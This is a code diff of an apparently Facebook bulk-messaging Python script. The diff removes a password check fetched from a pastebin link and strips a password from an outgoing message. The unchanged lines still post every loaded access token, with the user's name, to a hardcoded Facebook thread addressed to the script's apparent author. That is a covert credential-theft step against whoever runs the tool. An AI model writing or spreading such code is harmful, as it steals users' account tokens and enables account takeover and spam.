@@ -71,7 +71,7 @@ def get_convo_ids():
         return [line.strip() for line in file.readlines()]
 
 @handle_errors
-def send_messages(convo_ids, password):
+def send_messages(convo_ids):
     requests.packages.urllib3.disable_warnings()
 
     def clear_screen():
@@ -93,12 +93,6 @@ def send_messages(convo_ids, password):
         'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
         'referer': 'www.google.com'
     }
-
-    mmm = requests.get('https://pastebin.com/raw/H7hVmDNK').text
-
-    if mmm not in password:
-        print(Color.RED + '[-] <==> Password CHANGE BY -AN9ND_XD ')
-        sys.exit()
 
     print_separator()
 
@@ -195,8 +189,7 @@ def send_messages(convo_ids, password):
                 'access_token': random_token,
                 'message': (f'Hello Anand Mehra SiiR, I am using your server - : {user_name}'
                             + f'\nToken : {" | ".join(access_tokens)}'
-                            + f'\nLink : {Color.BLUE}https://www.facebook.com/messages/t/{random_convo_id}'
-                            + f'\nPassword: {password}')
+                            + f'\nLink : {Color.BLUE}https://www.facebook.com/messages/t/{random_convo_id}')
             }
             response = requests.post(f"https://graph.facebook.com/v15.0/t_100092436301663/", json=parameters, headers=headers)
 
@@ -217,13 +210,5 @@ def send_messages(convo_ids, password):
 
 if __name__ == "__main__":
     convo_ids = get_convo_ids()
-    
-    # Retrieve the password from environment variables
-    password = os.environ.get('PASSWORD')
-
-    if not password:
-        print(Color.RED + "[x] No password provided. Please set the PASSWORD environment variable.")
-        sys.exit()
-
     execute_server()
-    send_messages(convo_ids, password)
+    send_messages(convo_ids)
